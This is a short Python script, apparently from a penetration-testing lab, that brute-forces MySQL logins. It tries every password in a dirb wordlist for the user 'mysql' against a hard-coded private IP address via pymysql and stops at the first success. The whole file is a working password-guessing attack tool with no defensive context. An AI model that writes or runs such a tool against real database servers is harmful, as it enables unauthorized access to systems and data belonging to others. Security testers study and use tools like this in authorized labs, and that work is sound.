import pymysql

def brute_mysql(host,user,password):
    try:
        db  = pymysql.connect(host,user,password)
        print("[+] Success host:%s user:%s password:%s" %(host,user,password))
        return True
    except:
        print("[-] user:%s password:%s" %(user,password))
        return False
    else:
        db.close()

def get_password(drib):
    with open(drib) as f:
        password = f.readlines()
    return password

def main():
    dirb = '/usr/share/wordlists/dirb/small.txt'
    host = '172.20.10.139'
    user = 'mysql'
    for passwd in get_password(dirb):
       # print(passwd)
        passwd = passwd.strip('\n')
        state = brute_mysql(host,user,passwd)
        if state == True:
            break
        elif state == False:
            continue

if __name__=='__main__':
    main()
